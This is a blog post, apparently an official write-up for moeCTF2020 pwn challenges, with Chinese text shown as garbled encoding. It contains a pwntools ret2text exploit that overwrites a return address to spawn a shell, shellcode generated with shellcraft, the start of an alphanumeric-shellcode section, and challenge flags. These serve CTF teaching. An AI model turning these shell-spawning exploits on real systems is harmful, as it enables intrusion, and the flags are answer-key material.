<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 4.2.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"archive.next.arttnba3.cn","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="0x00.ç»ªè®ºå¾ˆè£å¹¸èƒ½å’ŒRXå¤§å“¥ä»¥åŠè¯¸ä½å¸¦å¸ˆå‚…å…±åŒå‡ºäº†moeCTF2020çš„é¢˜ç›®ï¼Œä¹Ÿå¸Œæœ›åšé¢˜çš„å„ä½èƒ½å¤Ÿè·å¾—å¿«ä¹XD é—²è¯ä¸å¤šè¯´ï¼Œç‚¹å¼€å³å¯æŸ¥çœ‹é¢˜è§£ğŸ‘‡  æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ç›´æ¥ä¸‹è½½">
<meta property="og:type" content="article">
<meta property="og:title" content="ã€CTFé¢˜è§£-0x03ã€‘moeCTF2020-partial official write up by arttnb3">
<meta property="og:url" content="http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/index.html">
<meta property="og:site_name" content="arttnba3&#39;s blog">
<meta property="og:description" content="0x00.ç»ªè®ºå¾ˆè£å¹¸èƒ½å’ŒRXå¤§å“¥ä»¥åŠè¯¸ä½å¸¦å¸ˆå‚…å…±åŒå‡ºäº†moeCTF2020çš„é¢˜ç›®ï¼Œä¹Ÿå¸Œæœ›åšé¢˜çš„å„ä½èƒ½å¤Ÿè·å¾—å¿«ä¹XD é—²è¯ä¸å¤šè¯´ï¼Œç‚¹å¼€å³å¯æŸ¥çœ‹é¢˜è§£ğŸ‘‡  æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ç›´æ¥ä¸‹è½½">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2020/10/08/xPJRSKz7MhOWn8I.png">
<meta property="og:image" content="https://i.loli.net/2020/08/01/frusiYZlnD39J4U.png">
<meta property="og:image" content="https://i.loli.net/2020/08/01/beydF6oiDAhQf4H.png">
<meta property="og:image" content="https://i.loli.net/2020/08/01/gDxUeytZdFS7Ph5.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/DqfQil7cmT6xIrS.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/X3YgIDKSVhWRJm5.png">
<meta property="og:image" content="https://i.loli.net/2020/08/01/JplCRSkxYLyEDKO.png">
<meta property="og:image" content="https://i.loli.net/2020/08/01/5fahTbeGgDlwNWt.png">
<meta property="og:image" content="https://i.loli.net/2020/09/15/kB9NEsTiAfwXSnz.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/cdTow3X5p6WUAHk.png">
<meta property="og:image" content="https://i.loli.net/2020/08/10/CTInhxDcJqsORVy.png">
<meta property="og:image" content="https://i.loli.net/2020/08/10/xptnlBUTFKISRsD.png">
<meta property="og:image" content="https://i.loli.net/2020/08/10/Bg5T7zeZVOWsJ9K.png">
<meta property="og:image" content="https://i.loli.net/2020/08/10/b5Ru7PmDZasA1jI.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/CmTilx3bQBschY8.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/rfdg523GS6IOy7k.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/1pKo5GdSW3Jf42u.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/oQREW8CdHIU59ai.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/ZGdgYATBi8L2fwm.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/8jlm6eZaWA1uMx5.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/IvTARLHcFo97XyS.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/BgKRwnzp5yTH7l8.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/XFxkV5w7uSKMmRG.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/MK2JW16oy3Db8FB.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/yPLIicR9daTVWB8.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/1fT5rBh23v6sayX.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/XOmzb8AWo92nvBi.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/tLToxVk8Cz19ARP.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/HDUg72BPC94AzJO.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/CYwqLfMRsyBxHK1.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/tHY6GJM3NWE8jUk.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/mLMFVgjHt5DzBas.png">
<meta property="og:image" content="https://i.loli.net/2020/08/06/BsmoxyjT8bOnvuh.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/vxIF8c1b4ATqtQW.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/hdC8S9FJGPBUbQl.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/fIoZyxE7F5biUQz.png">
<meta property="og:image" content="https://i.loli.net/2020/08/24/4HjdZqlBKp1fIrG.png">
<meta property="og:image" content="https://i.loli.net/2020/08/24/vf4jkEraNHWARhq.png">
<meta property="og:image" content="https://i.loli.net/2020/08/24/1Id5CqOT92ui4ZH.png">
<meta property="og:image" content="https://i.loli.net/2020/08/24/gY1Fxk7GERTjSBr.png">
<meta property="og:image" content="https://i.loli.net/2020/08/24/U8f5Y1CJrsdVT69.png">
<meta property="og:image" content="https://i.loli.net/2020/08/24/jQkcHxb5MgARspU.png">
<meta property="og:image" content="https://i.loli.net/2020/08/24/v79Elx15bWXdyoZ.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/hkzgUZj8rYPoFI3.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/GdmDsjEnXpBqobO.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/FidYB2N85WspeDt.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/zw9PxaDdpCf4h5B.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/QwGlAhc5fd9rItp.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/tpZQ1nE5oaGdsRX.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/oIvaelmuFLr24JY.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/s1t4V8f7k9JvLQT.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/k7gyPQfNmvLeJCn.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/7ILSlb95q12Dfny.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/thgBiFQcLl86mru.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/5qF6acIEWUGOvZ7.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/NDidotkIqXPuHn7.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/TRhAl2OYk1vWLUn.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/dPJUXZ6M9kx8RnN.png">
<meta property="og:image" content="https://img-blog.csdnimg.cn/20200809084003820.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/eWifdr1K3v8Vxka.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/6nQtRSwIdhX5peB.png">
<meta property="og:image" content="https://i.loli.net/2020/08/29/wtnmcLYru4OTdgs.png">
<meta property="og:image" content="https://i.loli.net/2020/08/29/lAEmSNwFPbVyfop.png">
<meta property="og:image" content="https://i.loli.net/2020/08/29/ZN8SXe5KECDAnJI.png">
<meta property="og:image" content="https://i.loli.net/2020/08/29/v7Kau1Bop9rckdU.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/vd5xKPI8GijfU1J.jpg">
<meta property="og:image" content="https://i.loli.net/2020/08/09/NbqLYV6teWK5ac4.jpg">
<meta property="og:image" content="https://i.loli.net/2020/08/09/GncNxdL3VBOEqme.jpg">
<meta property="og:image" content="https://i.loli.net/2020/08/09/QCOLqFobD9VR6Pz.jpg">
<meta property="og:image" content="https://i.loli.net/2020/08/09/vuzECAyDQGUibWx.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/o6kIlzaSBTD8Vs2.png">
<meta property="og:image" content="https://i.loli.net/2020/08/09/M6dEt8lkYCz3XFm.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/La7GHyJqUgs8Ypk.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/U9AtnyfguvRT8Mc.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/zvZ8fL4ajuQrgBR.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/s3OynaXBTk1hHEG.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/JtsWgfSHCvx2TkF.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/XfNGZtB9IwheKMW.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/vLb9BGnxU6gXYFj.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/A6EFvSJ4iQpjaMs.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/vVABX38Ki6uLrme.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/5N9jnd8zmtfwOuE.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/eiczTy3HB5pDmNZ.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/g7BfXK5VFrsjPJ8.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/LCmrMvXi4176Ka8.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/uso4xVS6PBq3eKF.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/WlUKzNnR56c29mA.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/naN1Du27iyLxdrU.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/l13R46VYfx9eb5a.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/KwufTlbtM7A3r4U.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/rp3luSN52OCIAos.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/bX3z5lheLdYI79a.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/RYecQ3KJW7rbkjZ.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/2sbVG16BrkJEOM8.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/Ud17cPvarkSs2my.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/8rR1fjKBd2xhqQL.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/DTwjCNSy5Fq6ga2.png">
<meta property="og:image" content="c:%5CUsers%5CSUR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1602093565355.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/KR2VgHfd5cezaAF.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/S3j5dG2kierolQI.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/FG39pIlXquEgjDS.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/bj8o5W4wCuvze1Q.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/yfndjKzWN6hrUCZ.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/2cbvVt1i3ZRF5DW.png">
<meta property="og:image" content="https://i.loli.net/2020/10/08/oXghLYjH6aG1n49.png">
<meta property="article:published_time" content="2020-09-06T20:44:37.000Z">
<meta property="article:modified_time" content="2020-11-16T16:24:37.739Z">
<meta property="article:author" content="arttnba3">
<meta property="article:tag" content="ä¿¡æ¯å®‰å…¨">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="ret2shellcode">
<meta property="article:tag" content="python">
<meta property="article:tag" content="ROP">
<meta property="article:tag" content="Alphanumeric Shellcode">
<meta property="article:tag" content="CTF">
<meta property="article:tag" content="ret2text">
<meta property="article:tag" content="æ ˆè¿ç§»">
<meta property="article:tag" content="UAF">
<meta property="article:tag" content="ret2libc">
<meta property="article:tag" content="canary">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2020/10/08/xPJRSKz7MhOWn8I.png">

<link rel="canonical" href="http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'en'
  };
</script>

  <title>ã€CTFé¢˜è§£-0x03ã€‘moeCTF2020-partial official write up by arttnb3 | arttnba3's blog</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">arttnba3's blog</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">- arttnba3çš„éšç§˜å°çª -</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/arttnba3" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://archive.next.arttnba3.cn/2020/09/07/%E3%80%90CTF%E9%A2%98%E8%A7%A3-0x03%E3%80%91moeCTF2020-write-up-by-arttnb3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="arttnba3">
      <meta itemprop="description" content="- åšäº†å…³äºä½ çš„æ¢¦ï¼Œæ‰€ä»¥ä¸æ„¿é†’æ¥å‘¢ -">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="arttnba3's blog">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          ã€CTFé¢˜è§£-0x03ã€‘moeCTF2020-partial official write up by arttnb3
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2020-09-07 04:44:37" itemprop="dateCreated datePublished" datetime="2020-09-07T04:44:37+08:00">2020-09-07</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2020-11-17 00:24:37" itemprop="dateModified" datetime="2020-11-17T00:24:37+08:00">2020-11-17</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
              <span class="post-meta-item-icon">
                <i class="fa fa-eye"></i>
              </span>
              <span class="post-meta-item-text">Views: </span>
              <span id="busuanzi_value_page_pv"></span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p>å¾ˆè£å¹¸èƒ½å’ŒRXå¤§å“¥ä»¥åŠè¯¸ä½å¸¦å¸ˆå‚…å…±åŒå‡ºäº†moeCTF2020çš„é¢˜ç›®ï¼Œä¹Ÿå¸Œæœ›åšé¢˜çš„å„ä½èƒ½å¤Ÿè·å¾—å¿«ä¹XD</p>
<p>é—²è¯ä¸å¤šè¯´ï¼Œç‚¹å¼€å³å¯æŸ¥çœ‹é¢˜è§£ğŸ‘‡</p>
<blockquote>
<p>æ³¨ï¼šåŸé¢˜çš†å¯åœ¨æœ¬é¡µé¢ç›´æ¥ä¸‹è½½</p>
</blockquote>
<a id="more"></a>

<h1 id="0x01-Pwn"><a href="#0x01-Pwn" class="headerlink" title="0x01.Pwn"></a>0x01.Pwn</h1><h2 id="Pwnä»å…¥é—¨åˆ°å…¥ç‹±"><a href="#Pwnä»å…¥é—¨åˆ°å…¥ç‹±" class="headerlink" title="Pwnä»å…¥é—¨åˆ°å…¥ç‹±"></a>Pwnä»å…¥é—¨åˆ°å…¥ç‹±</h2><blockquote>
<p>æ³¨ï¼š0åŸºç¡€æ–°äººè¿˜è¯·ä»”ç»†é˜…è¯»è¿™ä¸€ä»½æ–‡ä»¶</p>
</blockquote>
<p>åœ¨æ–‡ä»¶æœ«å°¾å¯ä»¥çœ‹åˆ°ç™½ç»™çš„flag</p>
<p><img src="https://i.loli.net/2020/10/08/xPJRSKz7MhOWn8I.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;PWN_T0_0WN!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Welcome"><a href="#Welcome" class="headerlink" title="Welcome"></a>Welcome</h2><p>ncï¼Œæç¤º<code>Please fill me up</code>ï¼Œè€ƒè™‘åˆ°æ ˆæº¢å‡ºï¼Œç›´æ¥è¾“å‡ºä¸€é•¿ä¸²éšæœºå­—ç¬¦ä¸²è·å¾—flag</p>
<p><img src="https://i.loli.net/2020/08/01/frusiYZlnD39J4U.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;W3lc0m3_t0_tH3_w0r1d_0f_PWN!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Baby-Pwn-ret2text"><a href="#Baby-Pwn-ret2text" class="headerlink" title="Baby Pwn - ret2text"></a>Baby Pwn - ret2text</h2><p> <a href="/download/moectf2020/pwn/baby_pwn/pwn1"ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜"">ç‚¹å‡»ä¸‹è½½-pwn1</a> </p>
<p>åœ¨IDAé‡Œæˆ‘ä»¬å¾ˆå®¹æ˜“çœ‹å¾—åˆ°å­˜åœ¨å­—ç¬¦ä¸²æº¢å‡ºæ¼æ´</p>
<p><img src="https://i.loli.net/2020/08/01/beydF6oiDAhQf4H.png" alt="image.png"></p>
<p>åŒæ ·çš„ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨<code>.text</code>æ®µå­˜åœ¨å¯ä»¥è¢«åˆ©ç”¨çš„<code>backdoor()</code>å‡½æ•°ï¼Œæ˜“çŸ¥è¯¥é¢˜å¯é€šè¿‡æ ˆæº¢å‡ºè¦†å†™è¿”å›åœ°å€è‡³<code>backdoor()</code>å‡½æ•°ä»¥getshellï¼Œæ˜¯ä¸ºä¸€é“å¾ˆç»å…¸çš„ret2text</p>
<p><img src="https://i.loli.net/2020/08/01/gDxUeytZdFS7Ph5.png" alt="image.png"></p>
<p>ç›¸å¯¹äºrbpçš„åç§»é‡ä¸º0x40+8 = 72</p>
<p><img src="https://i.loli.net/2020/08/06/DqfQil7cmT6xIrS.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2020/08/06/X3YgIDKSVhWRJm5.png" alt="image.png"></p>
<p>æ•…æ„é€ å¦‚ä¸‹payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'pwn1'</span>)<span class="comment">#p = remote('sec.eqqie.cn',10003)</span></span><br><span class="line">pl = <span class="string">'A'</span>*<span class="number">72</span> + p64(<span class="number">0x400676</span>)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(pl)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://i.loli.net/2020/08/01/JplCRSkxYLyEDKO.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;a0e65c41-fe8a-4db9-a070-f6593a5858c3&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Baby-Shellcode-shellcode"><a href="#Baby-Shellcode-shellcode" class="headerlink" title="Baby Shellcode - shellcode"></a>Baby Shellcode - shellcode</h2><p> <a href="/download/moectf2020/pwn/baby_shellcode/baby_shellcode"ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜"">ç‚¹å‡»ä¸‹è½½-baby_shellcode</a> </p>
<p>æ‹–è¿›IDAå¯ä»¥çœ‹åˆ°è¿™é“é¢˜æœ¬åœ°åªæœ‰ä¸€ä¸ªè¾“å‡ºè¯­å¥å’Œä¸€ä¸ªè¾“å…¥è¯­å¥</p>
<p><img src="https://i.loli.net/2020/08/01/5fahTbeGgDlwNWt.png" alt="image.png"></p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¨‹åºè¯»å…¥æˆ‘ä»¬çš„è¾“å…¥åç›´æ¥å°è¯•å°†æˆ‘ä»¬çš„è¾“å…¥ä½œä¸ºä»£ç æ¥æ‰§è¡Œï¼Œå› æ­¤æˆ‘ä»¬ç›´æ¥æ„é€ getshellçš„shellcodeè¾“å…¥å³å¯</p>
<p>ä½¿ç”¨<strong>asm(shellcraft.sh())</strong>å¯ä»¥ç›´æ¥è·å–ä¸€æ®µshellcode</p>
<p><img src="https://i.loli.net/2020/09/15/kB9NEsTiAfwXSnz.png" alt="image.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">moectf&#123;D0_yoU_kN0w_she11c0d3?&#125;</span><br></pre></td></tr></table></figure>

<h2 id="unusual-shellcode-Alphanumeric-Shellcode"><a href="#unusual-shellcode-Alphanumeric-Shellcode" class="headerlink" title="unusual shellcode - Alphanumeric Shellcode"></a>unusual shellcode - Alphanumeric Shellcode</h2><p> <a href="/download/moectf2020/pwn/unusual/unusual"ç‚¹å‡»æ­¤å¤„ä¸‹è½½åŸé¢˜"">ç‚¹å‡»ä¸‹è½½-unusual</a> </p>
<p>é¦–å…ˆæ˜¯æƒ¯ä¾‹çš„<code>checksec</code></p>
<p><img src="https://i.loli.net/2020/10/08/cdTow3X5p6WUAHk.png" alt="image.png"></p>
<p>é™¤äº†åœ°å€éšæœºåŒ–ä»¥å¤–å…¶ä»–çš„éƒ½å¼€æ»¡äº†</p>
<p>æ‹–å…¥IDAè¿›è¡Œåˆ†æ</p>
<p><img src="https://i.loli.net/2020/08/10/CTInhxDcJqsORVy.png" alt="image.png"></p>
<p>v7æ˜¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œå¹¶è¢«åˆ†é…åˆ°äº†<code>0x1000</code>å¤§å°çš„å†…å­˜ç©ºé—´</p>
<p>ç¨‹åºä¼šä»è¾“å…¥æµé€å­—èŠ‚è¯»å…¥æœ€å¤§4096ä¸ªå­—èŠ‚å†™å…¥åˆ°v7æ‰€æŒ‡å‘çš„ç©ºé—´ä¸Šï¼Œä¸”é™åˆ¶è¾“å…¥ä»…èƒ½ä¸ºå­—æ¯æˆ–æ•°å­—å¦åˆ™ç»ˆæ­¢è¾“å…¥</p>
<p>è¾“å…¥ç»“æŸåå°è¯•æ‰§è¡Œå‡½æ•°æŒ‡é’ˆv7</p>
<p>é‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è¾“å…¥ä¸€æ®µshellcodeå³å¯getshell</p>
<p>ä½†æ˜¯é™åˆ¶äº†è¾“å…¥åªèƒ½æ˜¯æ•°å­—å’Œå­—æ¯ï¼Œå¸¸è§çš„shellcodeéƒ½åŒ…å«ä¸€äº›å…¶ä»–å­—ç¬¦</p>
<p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å¯ä»¥å°è¯•ç™¾åº¦XD</p>
<p><img src="https://i.loli.net/2020/08/10/xptnlBUTFKISRsD.png" alt="image.png"></p>
<p>å¾—çŸ¥ä¸€ç§å«åš<strong>Alphanumeric Shellcode</strong>çš„ä¸œè¥¿www</p>
<p>å…·ä½“å‚è§ï¼š<a href="https://www.freebuf.com/articles/system/232280.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/232280.html</a></p>
<p>é¦–å…ˆä»GitHubä¸Šéšä¾¿æ‰¾ä¸€ä¸ªè½®å­</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> https://github.com/TaQini/alpha3.git</span><br></pre></td></tr></table></figure>

<p>ç„¶åç¼–å†™ç”Ÿæˆæˆ‘ä»¬çš„shellcodeçš„è„šæœ¬</p>
